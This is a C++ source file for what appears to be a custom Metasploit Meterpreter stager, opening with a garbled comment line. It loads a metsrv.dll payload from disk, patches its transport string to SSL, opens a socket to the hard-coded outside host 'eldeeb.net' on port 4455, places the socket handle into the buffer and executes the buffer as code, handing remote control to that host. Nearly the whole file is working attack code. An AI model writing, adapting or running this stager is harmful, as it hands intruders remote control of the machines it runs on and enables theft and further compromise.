//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
#include "main.h"

char* global_meterpreter_transport = "METERPRETER_TRANSPORT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char* global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
char* global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661; //big
int global_comm_timeout       = 0xaf79257f; // 300


int wmain(int argc, wchar_t *argv[])
{

	BYTE* buffer = nullptr;
	DWORD bufferSize = 0;
	DWORD index = 0;
	SOCKET ConnectSocket = INVALID_SOCKET;
	void (*function)();
	///////////////////////////////
	// !!! Load from file stuff !!!
	///////////////////////////////
	// To be edited when options are added

	wchar_t filename[MAX_PATH] = {0};
	if(argc == 1)
	{
		wcscpy_s(filename,L"e:\\metsrv.dll");
	}
	else { wcscpy_s(filename,argv[1]);
	}

	bufferSize = CopyStageToBuffer(filename, &buffer);
	const char Transport[] = "METERPRETER_TRANSPORT";
	const char ReplacementTransport[] = "METERPRETER_TRANSPORT_SSL";
	//PatchString(buffer, Transport, ReplacementTransport);
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)Transport, (int)strlen(Transport));
	PatchString(buffer, ReplacementTransport, index, strlen(ReplacementTransport));
	dprintf(L"[*] Offset found at 0x%08x\n", index);


	ConnectSocket = get_socket("eldeeb.net","4455");
	if (ConnectSocket == INVALID_SOCKET) dprintf(L"Failed to connect...\n");

	dprintf(L"[*] Setting EDI-to-be value to 0xBF at 0x%08x\n", &buffer);
	buffer[0] = 0xBF;
	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
	memcpy_s(buffer+1, 4, &ConnectSocket, 4);
	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
	dprintf(L"[*] Calling the function, bye bye inmet, hello metasploit!\n");

	function = (void (*)())buffer;
	function();
	//function();


	return 0;
}
